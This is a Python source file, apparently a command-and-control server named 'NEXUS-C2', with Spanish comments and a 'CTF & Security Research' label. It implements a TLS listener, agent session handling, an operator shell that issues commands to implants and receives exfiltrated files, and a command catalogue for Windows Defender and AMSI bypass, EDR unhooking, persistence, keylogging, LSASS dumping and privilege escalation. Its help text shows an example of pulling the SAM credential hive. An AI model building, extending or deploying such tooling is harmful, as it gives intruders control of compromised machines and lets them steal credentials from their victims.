#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    NEXUS-C2 ADVANCED SERVER v2.6                            ║
║                    Author: Security Research Team                           ║
║                    Created: JDEXPLOIT                                       ║
║                    Purpose: CTF & Security Research                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

FEATURES:
✅ Evasión avanzada de Windows Defender
✅ Cifrado AES-256-GCM + XChaCha20-Poly1305
✅ Comunicación polimórfica
✅ Técnicas LOLBin + Direct Syscalls
✅ Soporte para múltiples transportes
✅ Anti-sandbox y anti-debugging
"""

import socket
import ssl
import struct
import json
import base64
import time
import threading
import os
import sys
import select
import hashlib
import hmac
import secrets
import zlib
import pathlib
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import nacl.secret
import nacl.utils
import nacl.pwhash

# ============================================================================
# CONFIGURACIÓN DE SEGURIDAD
# ============================================================================

@dataclass
class SecurityConfig:
    """Configuración de seguridad del C2"""
    # Cifrado
    encryption_key: bytes = b'default_key_change_in_production!'
    encryption_algorithm: str = 'AES-256-GCM'
    
    # Autenticación
    hmac_key: bytes = b'default_hmac_key_change_me'
    session_token_length: int = 32
    
    # Obfuscación
    use_polymorphic_encoding: bool = True
    use_compression: bool = True
    use_fake_traffic: bool = True
    
    # Timeouts
    heartbeat_interval: int = 30
    command_timeout: int = 300
    max_payload_size: int = 10 * 1024 * 1024  # 10MB
    
    # Network
    use_ssl: bool = True
    ssl_cert: str = './certs/server.crt'
    ssl_key: str = './certs/server.key'

# ============================================================================
# CIFRADO AVANZADO
# ============================================================================

class AdvancedCrypto:
    """Sistema de cifrado avanzado con múltiples algoritmos"""
    
    def __init__(self, master_key: bytes):
        self.master_key = master_key
        self.backend = default_backend()
        
        # Derivar claves específicas
        self.kdf = PBKDF2HMAC(
            algorithm=hashes.SHA512(),
            length=96,  # 32 para AES + 32 para XChaCha + 32 para HMAC
            salt=b'nexus_c2_salt_2026',
            iterations=100000,
            backend=self.backend
        )
        
        derived_keys = self.kdf.derive(master_key)
        self.aes_key = derived_keys[0:32]
        self.xchacha_key = derived_keys[32:64]
        self.hmac_key = derived_keys[64:96]
    
    def encrypt_aes_gcm(self, data: bytes, associated_data: bytes = None) -> bytes:
        """Cifrado AES-256-GCM con autenticación"""
        iv = secrets.token_bytes(12)
        cipher = Cipher(
            algorithms.AES(self.aes_key),
            modes.GCM(iv),
            backend=self.backend
        )
        encryptor = cipher.encryptor()
        
        if associated_data:
            encryptor.authenticate_additional_data(associated_data)
        
        ciphertext = encryptor.update(data) + encryptor.finalize()
        tag = encryptor.tag
        
        # Formato: IV(12) + TAG(16) + CIPHERTEXT
        return iv + tag + ciphertext
    
    def decrypt_aes_gcm(self, encrypted: bytes, associated_data: bytes = None) -> bytes:
        """Descifrado AES-256-GCM"""
        iv = encrypted[0:12]
        tag = encrypted[12:28]
        ciphertext = encrypted[28:]
        
        cipher = Cipher(
            algorithms.AES(self.aes_key),
            modes.GCM(iv, tag),
            backend=self.backend
        )
        decryptor = cipher.decryptor()
        
        if associated_data:
            decryptor.authenticate_additional_data(associated_data)
        
        return decryptor.update(ciphertext) + decryptor.finalize()
    
    def encrypt_xchacha(self, data: bytes) -> bytes:
        """Cifrado XChaCha20-Poly1305"""
        box = nacl.secret.SecretBox(self.xchacha_key)
        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        encrypted = box.encrypt(data, nonce)
        return encrypted
    
    def decrypt_xchacha(self, encrypted: bytes) -> bytes:
        """Descifrado XChaCha20-Poly1305"""
        box = nacl.secret.SecretBox(self.xchacha_key)
        return box.decrypt(encrypted)
    
    def calculate_hmac(self, data: bytes) -> bytes:
        """Calcular HMAC-SHA512"""
        h = hmac.HMAC(self.hmac_key, hashes.SHA512(), backend=self.backend)
        h.update(data)
        return h.finalize()
    
    def verify_hmac(self, data: bytes, signature: bytes) -> bool:
        """Verificar HMAC"""
        try:
            h = hmac.HMAC(self.hmac_key, hashes.SHA512(), backend=self.backend)
            h.update(data)
            h.verify(signature)
            return True
        except:
            return False

# ============================================================================
# PROTOCOLO DE COMUNICACIÓN POLIMÓRFICO
# ============================================================================

class PolymorphicProtocol:
    """Protocolo de comunicación con ofuscación polimórfica"""
    
    class EncodingType(Enum):
        BASE64 = 1
        HEX = 2
        REVERSE = 3
        XOR = 4
        ROT13 = 5
        CUSTOM_B85 = 6
    
    def __init__(self):
        self.encodings = list(self.EncodingType)
        self.current_encoding = 0
    
    def polymorphic_encode(self, data: bytes) -> Tuple[bytes, int]:
        """Codificar datos usando técnica aleatoria"""
        enc_type = secrets.choice(self.encodings)
        
        if enc_type == self.EncodingType.BASE64:
            encoded = base64.b64encode(data)
        
        elif enc_type == self.EncodingType.HEX:
            encoded = data.hex().encode()
        
        elif enc_type == self.EncodingType.REVERSE:
            encoded = data[::-1]
        
        elif enc_type == self.EncodingType.XOR:
            key = secrets.token_bytes(1)[0]
            encoded = bytes([b ^ key for b in data])
            encoded = key.to_bytes(1, 'little') + encoded
        
        elif enc_type == self.EncodingType.ROT13:
            encoded = self._rot13_bytes(data)
        
        elif enc_type == self.EncodingType.CUSTOM_B85:
            encoded = base64.b85encode(data)
        
        # Añadir marcador de tipo
        marker = enc_type.value.to_bytes(1, 'little')
        return marker + encoded, enc_type.value
    
    def polymorphic_decode(self, encoded: bytes) -> bytes:
        """Decodificar datos polimórficos"""
        if len(encoded) < 1:
            return b''
        
        enc_type = encoded[0]
        data = encoded[1:]
        
        if enc_type == self.EncodingType.BASE64.value:
            return base64.b64decode(data)
        
        elif enc_type == self.EncodingType.HEX.value:
            return bytes.fromhex(data.decode())
        
        elif enc_type == self.EncodingType.REVERSE.value:
            return data[::-1]
        
        elif enc_type == self.EncodingType.XOR.value:
            if len(data) < 1:
                return b''
            key = data[0]
            return bytes([b ^ key for b in data[1:]])
        
        elif enc_type == self.EncodingType.ROT13.value:
            return self._rot13_bytes(data)
        
        elif enc_type == self.EncodingType.CUSTOM_B85.value:
            return base64.b85decode(data)
        
        return b''
    
    def _rot13_bytes(self, data: bytes) -> bytes:
        """ROT13 para bytes"""
        result = bytearray()
        for b in data:
            if 65 <= b <= 90:  # A-Z
                result.append((b - 65 + 13) % 26 + 65)
            elif 97 <= b <= 122:  # a-z
                result.append((b - 97 + 13) % 26 + 97)
            else:
                result.append(b)
        return bytes(result)

# ============================================================================
# GESTIÓN DE SESIONES AVANZADA
# ============================================================================

@dataclass
class AgentSession:
    """Información de sesión del agente"""
    session_id: str
    client_socket: socket.socket
    address: Tuple[str, int]
    agent_info: Dict
    crypto: AdvancedCrypto
    protocol: PolymorphicProtocol
    connected_at: datetime
    last_heartbeat: datetime
    is_alive: bool = True
    is_authenticated: bool = False
    current_job: Optional[Dict] = None
    capabilities: List[str] = None
    os_version: str = "Unknown"
    architecture: str = "x64"
    integrity_level: str = "Medium"
    process_id: int = 0
    
    def __post_init__(self):
        if self.capabilities is None:
            self.capabilities = ["shell", "file_transfer", "process_manage"]
    
    def to_dict(self) -> Dict:
        """Convertir a diccionario para JSON"""
        return {
            "session_id": self.session_id,
            "address": f"{self.address[0]}:{self.address[1]}",
            "hostname": self.agent_info.get("hostname", "Unknown"),
            "username": self.agent_info.get("username", "Unknown"),
            "os": self.os_version,
            "arch": self.architecture,
            "integrity": self.integrity_level,
            "pid": self.process_id,
            "connected": self.connected_at.isoformat(),
            "last_heartbeat": self.last_heartbeat.isoformat(),
            "alive": self.is_alive,
            "authenticated": self.is_authenticated,
            "capabilities": self.capabilities
        }

# ============================================================================
# SERVIDOR C2 PRINCIPAL
# ============================================================================

class NexusC2Server:
    """Servidor C2 avanzado con capacidades de evasión"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 443):
        self.host = host
        self.port = port
        self.running = True
        self.sessions: Dict[str, AgentSession] = {}
        self.session_lock = threading.Lock()
        
        # Configuración
        self.config = SecurityConfig()
        self.crypto = AdvancedCrypto(self.config.encryption_key)
        self.protocol = PolymorphicProtocol()
        
        # Comandos disponibles
        self.commands = self._initialize_commands()
        
        # Estadísticas
        self.stats = {
            "connections": 0,
            "commands_executed": 0,
            "data_transferred": 0,
            "errors": 0,
            "start_time": datetime.now()
        }
        
        # Crear directorios necesarios
        self._create_directories()
        
        # SSL Context si se usa SSL
        self.ssl_context = None
        if self.config.use_ssl:
            self._setup_ssl()
    
    def _create_directories(self):
        """Crear estructura de directorios"""
        dirs = [
            "downloads",
            "uploads", 
            "logs",
            "modules",
            "certs",
            "screenshots",
            "loot"
        ]
        
        for dir_name in dirs:
            os.makedirs(dir_name, exist_ok=True)
    
    def _setup_ssl(self):
        """Configurar contexto SSL/TLS"""
        if not os.path.exists(self.config.ssl_cert) or not os.path.exists(self.config.ssl_key):
            print("[!] Generando certificados SSL autofirmados...")
            self._generate_self_signed_cert()
        
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ssl_context.load_cert_chain(
            certfile=self.config.ssl_cert,
            keyfile=self.config.ssl_key
        )
        self.ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
        self.ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
    
    def _generate_self_signed_cert(self):
        """Generar certificado autofirmado (solo para lab)"""
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        
        # Generar clave privada
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Generar certificado
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Research"),
            x509.NameAttribute(NameOID.COMMON_NAME, "nexus-c2.local"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
            critical=False,
        ).sign(key, hashes.SHA256(), default_backend())
        
        # Guardar certificado
        with open(self.config.ssl_cert, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        # Guardar clave privada
        with open(self.config.ssl_key, "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        print(f"[+] Certificados generados en {self.config.ssl_cert}")
    
    def _initialize_commands(self) -> Dict:
        """Inicializar todos los comandos disponibles"""
        return {
            # Comandos básicos del sistema
            "shell": {
                "description": "Ejecutar comando en shell",
                "usage": "shell <comando>",
                "category": "system"
            },
            "powershell": {
                "description": "Ejecutar PowerShell",
                "usage": "powershell <script/comando>",
                "category": "system"
            },
            "cmd": {
                "description": "Ejecutar comando CMD",
                "usage": "cmd <comando>",
                "category": "system"
            },
            
            # Comandos de archivos
            "download": {
                "description": "Descargar archivo",
                "usage": "download <ruta_remota>",
                "category": "files"
            },
            "upload": {
                "description": "Subir archivo",
                "usage": "upload <ruta_local> <ruta_remota>",
                "category": "files"
            },
            "ls": {
                "description": "Listar directorio",
                "usage": "ls [ruta]",
                "category": "files"
            },
            "cd": {
                "description": "Cambiar directorio",
                "usage": "cd <ruta>",
                "category": "files"
            },
            "cat": {
                "description": "Mostrar contenido de archivo",
                "usage": "cat <archivo>",
                "category": "files"
            },
            
            # Comandos de sistema avanzados
            "ps": {
                "description": "Listar procesos",
                "usage": "ps [filtro]",
                "category": "system"
            },
            "kill": {
                "description": "Terminar proceso",
                "usage": "kill <pid>",
                "category": "system"
            },
            "service": {
                "description": "Administrar servicios",
                "usage": "service <list|start|stop|status> [nombre]",
                "category": "system"
            },
            
            # Comandos de red
            "ifconfig": {
                "description": "Información de red",
                "usage": "ifconfig",
                "category": "network"
            },
            "netstat": {
                "description": "Conexiones de red",
                "usage": "netstat [-ano]",
                "category": "network"
            },
            "portscan": {
                "description": "Escanear puertos",
                "usage": "portscan <ip> <puerto_inicio> <puerto_fin>",
                "category": "network"
            },
            
            # Comandos de persistencia
            "persist": {
                "description": "Instalar persistencia",
                "usage": "persist <method> [opciones]",
                "category": "persistence",
                "methods": ["registry", "scheduled_task", "service", "startup"]
            },
            "unpersist": {
                "description": "Remover persistencia",
                "usage": "unpersist",
                "category": "persistence"
            },
            
            # Comandos de evasión
            "bypass_defender": {
                "description": "Intentar bypass de Windows Defender",
                "usage": "bypass_defender [método]",
                "category": "evasion",
                "methods": ["amsi", "etw", "process_hollowing", "direct_syscalls"]
            },
            "unhook": {
                "description": "Unhook DLLs de EDR",
                "usage": "unhook",
                "category": "evasion"
            },
            
            # Comandos de información
            "sysinfo": {
                "description": "Información del sistema",
                "usage": "sysinfo",
                "category": "info"
            },
            "whoami": {
                "description": "Información del usuario",
                "usage": "whoami [/all]",
                "category": "info"
            },
            "domain_info": {
                "description": "Información del dominio AD",
                "usage": "domain_info",
                "category": "info"
            },
            
            # Comandos de privilege escalation
            "getsystem": {
                "description": "Intentar escalar privilegios",
                "usage": "getsystem [método]",
                "category": "privilege",
                "methods": ["token_duplication", "named_pipe", "service"]
            },
            
            # Comandos especiales
            "screenshot": {
                "description": "Capturar pantalla",
                "usage": "screenshot [nombre_archivo]",
                "category": "special"
            },
            "keylogger": {
                "description": "Iniciar/parar keylogger",
                "usage": "keylogger <start|stop|dump>",
                "category": "special"
            },
            "minidump": {
                "description": "Dumpear memoria LSASS",
                "usage": "minidump [archivo]",
                "category": "special"
            },
            
            # Comandos de C2
            "sleep": {
                "description": "Cambiar intervalo de beacon",
                "usage": "sleep <segundos>",
                "category": "c2"
            },
            "jitter": {
                "description": "Añadir jitter al beacon",
                "usage": "jitter <porcentaje>",
                "category": "c2"
            },
            "proxy": {
                "description": "Configurar proxy",
                "usage": "proxy <http|socks> <host:puerto>",
                "category": "c2"
            },
            
            # Comandos de administración
            "help": {
                "description": "Mostrar ayuda",
                "usage": "help [comando]",
                "category": "admin"
            },
            "exit": {
                "description": "Terminar sesión",
                "usage": "exit",
                "category": "admin"
            }
        }
    
    def start(self):
        """Iniciar servidor C2"""
        print(self._get_banner())
        
        # Crear socket principal
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(100)
            
            if self.config.use_ssl and self.ssl_context:
                print(f"[+] Servidor C2 escuchando en https://{self.host}:{self.port}")
            else:
                print(f"[+] Servidor C2 escuchando en http://{self.host}:{self.port}")
            
            # Thread para aceptar conexiones
            accept_thread = threading.Thread(target=self._accept_connections, args=(server_socket,))
            accept_thread.daemon = True
            accept_thread.start()
            
            # Thread para limpieza de sesiones
            cleanup_thread = threading.Thread(target=self._cleanup_sessions)
            cleanup_thread.daemon = True
            cleanup_thread.start()
            
            # Thread para generar tráfico falso
            if self.config.use_fake_traffic:
                fake_traffic_thread = threading.Thread(target=self._generate_fake_traffic)
                fake_traffic_thread.daemon = True
                fake_traffic_thread.start()
            
            # Iniciar shell interactivo
            self._interactive_shell()
            
        except Exception as e:
            print(f"[!] Error iniciando servidor: {e}")
        finally:
            self.running = False
            server_socket.close()
            print("[!] Servidor detenido")
    
    def _accept_connections(self, server_socket: socket.socket):
        """Aceptar nuevas conexiones de agentes"""
        while self.running:
            try:
                client_socket, address = server_socket.accept()
                
                # Aplicar SSL si está configurado
                if self.config.use_ssl and self.ssl_context:
                    try:
                        client_socket = self.ssl_context.wrap_socket(
                            client_socket, 
                            server_side=True
                        )
                    except Exception as e:
                        print(f"[!] Error SSL con {address}: {e}")
                        client_socket.close()
                        continue
                
                # Procesar en thread separado
                thread = threading.Thread(
                    target=self._handle_agent_connection,
                    args=(client_socket, address)
                )
                thread.daemon = True
                thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"[!] Error aceptando conexión: {e}")
    
    def _handle_agent_connection(self, client_socket: socket.socket, address: Tuple[str, int]):
        """Manejar conexión de agente individual"""
        session_id = None
        
        try:
            # Leer handshake inicial
            handshake_data = self._receive_data(client_socket)
            if not handshake_data:
                print(f"[!] Conexión cerrada por {address} sin handshake")
                client_socket.close()
                return
            
            # Decodificar handshake
            try:
                handshake = json.loads(handshake_data.decode('utf-8', errors='ignore'))
            except:
                print(f"[!] Handshake inválido de {address}")
                client_socket.close()
                return
            
            # Verificar que sea un agente válido
            if handshake.get("type") != "agent_handshake":
                print(f"[!] Tipo de handshake incorrecto de {address}")
                client_socket.close()
                return
            
            # Extraer información del agente
            agent_info = handshake.get("agent_info", {})
            
            # Generar ID de sesión único
            session_id = f"{address[0]}_{address[1]}_{int(time.time())}"
            
            # Crear sesión
            session = AgentSession(
                session_id=session_id,
                client_socket=client_socket,
                address=address,
                agent_info=agent_info,
                crypto=self.crypto,
                protocol=self.protocol,
                connected_at=datetime.now(),
                last_heartbeat=datetime.now()
            )
            
            # Extraer información adicional
            session.os_version = agent_info.get("os", "Unknown")
            session.architecture = agent_info.get("arch", "x64")
            session.process_id = agent_info.get("pid", 0)
            session.integrity_level = agent_info.get("integrity", "Medium")
            session.capabilities = agent_info.get("capabilities", [])
            
            # Añadir sesión al diccionario
            with self.session_lock:
                self.sessions[session_id] = session
            
            self.stats["connections"] += 1
            
            print(f"\n[+] Nuevo agente conectado: {session_id}")
            print(f"    Host: {agent_info.get('hostname', 'Unknown')}")
            print(f"    User: {agent_info.get('username', 'Unknown')}")
            print(f"    OS: {session.os_version}")
            print(f"    Arch: {session.architecture}")
            print(f"    PID: {session.process_id}")
            print(f"    Integrity: {session.integrity_level}")
            print(f"    Capabilities: {', '.join(session.capabilities)}")
            
            # Enviar confirmación
            response = {
                "type": "handshake_ack",
                "session_id": session_id,
                "status": "connected",
                "config": {
                    "heartbeat_interval": self.config.heartbeat_interval,
                    "use_compression": self.config.use_compression,
                    "max_payload": self.config.max_payload_size
                }
            }
            
            self._send_data(client_socket, json.dumps(response).encode())
            
            # Bucle principal de la sesión
            self._session_loop(session)
            
        except Exception as e:
            print(f"[!] Error manejando conexión {address}: {e}")
        finally:
            if session_id:
                with self.session_lock:
                    if session_id in self.sessions:
                        del self.sessions[session_id]
                        print(f"[-] Sesión {session_id} cerrada")
            
            try:
                client_socket.close()
            except:
                pass
    
    def _session_loop(self, session: AgentSession):
        """Bucle principal para manejar sesión de agente"""
        while session.is_alive and self.running:
            try:
                # Configurar timeout para evitar bloqueos
                session.client_socket.settimeout(30.0)
                
                # Recibir datos
                raw_data = self._receive_data(session.client_socket)
                if not raw_data:
                    session.is_alive = False
                    break
                
                # Procesar mensaje
                self._process_agent_message(session, raw_data)
                
                # Actualizar heartbeat
                session.last_heartbeat = datetime.now()
                
            except socket.timeout:
                # Timeout normal, continuar
                continue
            except Exception as e:
                print(f"[!] Error en sesión {session.session_id}: {e}")
                session.is_alive = False
                break
    
    def _process_agent_message(self, session: AgentSession, raw_data: bytes):
        """Procesar mensaje recibido del agente"""
        try:
            # Decodificar mensaje
            message = json.loads(raw_data.decode('utf-8', errors='ignore'))
            msg_type = message.get("type")
            
            if msg_type == "heartbeat":
                # Simple heartbeat, solo registrar
                pass
                
            elif msg_type == "command_result":
                # Resultado de comando ejecutado
                command_id = message.get("command_id")
                result = message.get("result", "")
                success = message.get("success", False)
                
                print(f"\n[+] Resultado de comando {command_id} de {session.session_id}:")
                print(f"    Success: {success}")
                
                if result:
                    # Guardar resultado si es grande
                    if len(result) > 1000:
                        result_file = f"logs/result_{command_id}_{int(time.time())}.txt"
                        with open(result_file, "w", encoding="utf-8") as f:
                            f.write(result)
                        print(f"    Resultado guardado en: {result_file}")
                    else:
                        print(f"    Result: {result[:500]}...")
                
                self.stats["commands_executed"] += 1
            
            elif msg_type == "file_chunk":
                # Chunk de archivo descargado
                file_id = message.get("file_id")
                chunk_data = base64.b64decode(message.get("data", ""))
                chunk_num = message.get("chunk_num", 0)
                total_chunks = message.get("total_chunks", 1)
                
                # Guardar chunk
                download_dir = f"downloads/{session.session_id}"
                os.makedirs(download_dir, exist_ok=True)
                
                file_path = os.path.join(download_dir, file_id)
                mode = "ab" if chunk_num > 0 else "wb"
                
                with open(file_path, mode) as f:
                    f.write(chunk_data)
                
                if chunk_num == total_chunks - 1:
                    size = os.path.getsize(file_path)
                    print(f"[+] Archivo {file_id} descargado completado: {size} bytes")
                    self.stats["data_transferred"] += size
            
            elif msg_type == "error":
                # Error del agente
                error_msg = message.get("message", "Unknown error")
                print(f"[!] Error de agente {session.session_id}: {error_msg}")
                self.stats["errors"] += 1
            
            else:
                print(f"[?] Mensaje desconocido de {session.session_id}: {msg_type}")
                
        except Exception as e:
            print(f"[!] Error procesando mensaje de {session.session_id}: {e}")
    
    def _send_command(self, session: AgentSession, command: str, args: List[str] = None):
        """Enviar comando a agente"""
        if args is None:
            args = []
        
        command_id = secrets.token_hex(8)
        
        command_data = {
            "type": "execute_command",
            "command_id": command_id,
            "command": command,
            "args": args,
            "timestamp": int(time.time())
        }
        
        try:
            self._send_data(
                session.client_socket,
                json.dumps(command_data).encode()
            )
            
            print(f"[+] Comando enviado a {session.session_id}: {command} {' '.join(args)}")
            return command_id
            
        except Exception as e:
            print(f"[!] Error enviando comando a {session.session_id}: {e}")
            return None
    
    def _receive_data(self, sock: socket.socket) -> Optional[bytes]:
        """Recibir datos con protocolo de longitud"""
        try:
            # Leer longitud (4 bytes big endian)
            length_bytes = sock.recv(4)
            if len(length_bytes) < 4:
                return None
            
            length = struct.unpack('>I', length_bytes)[0]
            
            # Verificar límite de tamaño
            if length > self.config.max_payload_size:
                print(f"[!] Payload demasiado grande: {length} bytes")
                return None
            
            # Leer datos
            data = b''
            while len(data) < length:
                chunk = sock.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            return data
            
        except Exception as e:
            print(f"[!] Error recibiendo datos: {e}")
            return None
    
    def _send_data(self, sock: socket.socket, data: bytes) -> bool:
        """Enviar datos con protocolo de longitud"""
        try:
            # Añadir longitud (4 bytes big endian)
            length = len(data)
            length_bytes = struct.pack('>I', length)
            
            # Enviar longitud + datos
            sock.sendall(length_bytes + data)
            return True
            
        except Exception as e:
            print(f"[!] Error enviando datos: {e}")
            return False
    
    def _cleanup_sessions(self):
        """Limpiar sesiones inactivas"""
        while self.running:
            time.sleep(60)  # Cada minuto
            
            with self.session_lock:
                current_time = datetime.now()
                sessions_to_remove = []
                
                for session_id, session in self.sessions.items():
                    # Verificar si ha pasado mucho tiempo sin heartbeat
                    time_diff = (current_time - session.last_heartbeat).total_seconds()
                    
                    if time_diff > self.config.command_timeout:
                        sessions_to_remove.append(session_id)
                        print(f"[-] Sesión {session_id} timeout después de {time_diff:.0f}s")
                
                # Remover sesiones
                for session_id in sessions_to_remove:
                    try:
                        session = self.sessions[session_id]
                        session.client_socket.close()
                    except:
                        pass
                    finally:
                        del self.sessions[session_id]
    
    def _generate_fake_traffic(self):
        """Generar tráfico falso para evadir detección"""
        while self.running:
            try:
                # Esperar tiempo aleatorio
                sleep_time = secrets.randbelow(300) + 60  # 60-360 segundos
                time.sleep(sleep_time)
                
                # Generar URL falsa de beacon
                fake_urls = [
                    "https://www.google.com/",
                    "https://api.github.com/",
                    "https://stackoverflow.com/",
                    "https://www.microsoft.com/",
                    "https://aws.amazon.com/"
                ]
                
                fake_url = secrets.choice(fake_urls)
                print(f"[~] Fake traffic generated to: {fake_url}")
                
            except:
                pass
    
    # ============================================================================
    # SHELL INTERACTIVO
    # ============================================================================
    
    def _interactive_shell(self):
        """Shell interactivo del operador"""
        print("\n" + "="*80)
        print("NEXUS-C2 INTERACTIVE SHELL")
        print("Type 'help' for commands, 'sessions' to list agents")
        print("="*80)
        
        while self.running:
            try:
                cmd = input("\nnexus> ").strip()
                
                if not cmd:
                    continue
                
                # Parsear comando
                parts = cmd.split()
                main_cmd = parts[0].lower()
                
                if main_cmd == "help":
                    self._show_help(parts[1] if len(parts) > 1 else None)
                
                elif main_cmd == "sessions":
                    self._list_sessions()
                
                elif main_cmd == "session":
                    if len(parts) > 1:
                        self._handle_session_command(parts[1])
                    else:
                        print("[!] Usage: session <session_id>")
                
                elif main_cmd == "broadcast":
                    if len(parts) > 1:
                        self._broadcast_command(" ".join(parts[1:]))
                    else:
                        print("[!] Usage: broadcast <command>")
                
                elif main_cmd == "kill":
                    if len(parts) > 1:
                        self._kill_session(parts[1])
                    else:
                        print("[!] Usage: kill <session_id>")
                
                elif main_cmd == "status":
                    self._show_status()
                
                elif main_cmd == "modules":
                    self._list_modules()
                
                elif main_cmd == "load":
                    if len(parts) > 1:
                        self._load_module(parts[1])
                    else:
                        print("[!] Usage: load <module_name>")
                
                elif main_cmd == "clear":
                    os.system('clear' if os.name != 'nt' else 'cls')
                
                elif main_cmd == "exit":
                    print("[!] Shutting down Nexus-C2...")
                    self.running = False
                
                else:
                    print(f"[!] Unknown command: {main_cmd}")
                    print("    Type 'help' for available commands")
                    
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to shutdown server")
            except Exception as e:
                print(f"[!] Error: {e}")
    
    def _show_help(self, command: str = None):
        """Mostrar ayuda de comandos"""
        if command:
            if command in self.commands:
                cmd_info = self.commands[command]
                print(f"\nCommand: {command}")
                print(f"Description: {cmd_info.get('description', 'No description')}")
                print(f"Usage: {cmd_info.get('usage', 'No usage info')}")
                print(f"Category: {cmd_info.get('category', 'general')}")
                
                if "methods" in cmd_info:
                    print(f"Available methods: {', '.join(cmd_info['methods'])}")
            else:
                print(f"[!] Command not found: {command}")
        else:
            print("\n" + "="*80)
            print("NEXUS-C2 COMMAND REFERENCE")
            print("="*80)
            
            # Agrupar por categoría
            categories = {}
            for cmd_name, cmd_info in self.commands.items():
                category = cmd_info.get("category", "general")
                if category not in categories:
                    categories[category] = []
                categories[category].append((cmd_name, cmd_info))
            
            # Mostrar por categoría
            for category, commands in categories.items():
                print(f"\n[{category.upper()}]")
                for cmd_name, cmd_info in commands:
                    desc = cmd_info.get("description", "")
                    print(f"  {cmd_name:20} - {desc}")
            
            print("\n[ADMIN COMMANDS]")
            print("  sessions          - List connected agents")
            print("  session <id>      - Interact with specific agent")
            print("  broadcast <cmd>   - Send command to all agents")
            print("  kill <id>         - Terminate agent session")
            print("  status            - Show server status")
            print("  modules           - List available modules")
            print("  load <module>     - Load module")
            print("  clear             - Clear screen")
            print("  exit              - Shutdown server")
            
            print("\nExamples:")
            print("  nexus> session 192.168.1.100_443_1234567890")
            print("  nexus@agent> whoami")
            print("  nexus@agent> download C:\\Windows\\System32\\config\\SAM")
            print("  nexus@agent> bypass_defender amsi")
    
    def _list_sessions(self):
        """Listar sesiones activas"""
        with self.session_lock:
            if not self.sessions:
                print("[!] No active sessions")
                return
            
            print(f"\n[+] Active Sessions ({len(self.sessions)}):")
            print("="*100)
            
            for i, (session_id, session) in enumerate(self.sessions.items(), 1):
                uptime = (datetime.now() - session.connected_at).total_seconds()
                idle_time = (datetime.now() - session.last_heartbeat).total_seconds()
                
                print(f"{i:2}. {session_id}")
                print(f"   ├─ Host: {session.agent_info.get('hostname', 'Unknown')}")
                print(f"   ├─ User: {session.agent_info.get('username', 'Unknown')}")
                print(f"   ├─ OS: {session.os_version}")
                print(f"   ├─ Integrity: {session.integrity_level}")
                print(f"   ├─ Uptime: {uptime:.0f}s")
                print(f"   ├─ Idle: {idle_time:.0f}s")
                print(f"   ├─ IP: {session.address[0]}:{session.address[1]}")
                print(f"   └─ Capabilities: {', '.join(session.capabilities)}")
                print("─" * 100)
    
    def _handle_session_command(self, session_id: str):
        """Manejar comando de sesión específica"""
        with self.session_lock:
            if session_id not in self.sessions:
                print(f"[!] Session not found: {session_id}")
                return
            
            session = self.sessions[session_id]
        
        print(f"\n[+] Session: {session_id}")
        print(f"    Host: {session.agent_info.get('hostname')}")
        print(f"    User: {session.agent_info.get('username')}")
        print(f"    Type 'back' to return to main shell\n")
        
        # Shell de sesión
        while session_id in self.sessions and self.running:
            try:
                prompt = f"nexus@{session_id[:15]}> "
                cmd_line = input(prompt).strip()
                
                if not cmd_line:
                    continue
                
                if cmd_line.lower() == "back":
                    break
                
                if cmd_line.lower() == "help":
                    print("\nSession Commands:")
                    print("  back              - Return to main shell")
                    print("  help              - Show this help")
                    print("  <any_c2_command>  - Execute command on agent")
                    print("\nExamples:")
                    print("  whoami")
                    print("  shell ipconfig /all")
                    print("  powershell Get-Process")
                    print("  download C:\\Windows\\System32\\config\\SAM")
                    print("  bypass_defender amsi")
                    continue
                
                # Parsear comando
                parts = cmd_line.split()
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                # Enviar comando al agente
                command_id = self._send_command(session, cmd, args)
                if command_id:
                    print(f"[+] Command sent with ID: {command_id}")
                    print("    Waiting for response...")
                
            except KeyboardInterrupt:
                print("\n[!] Returning to main shell...")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
    
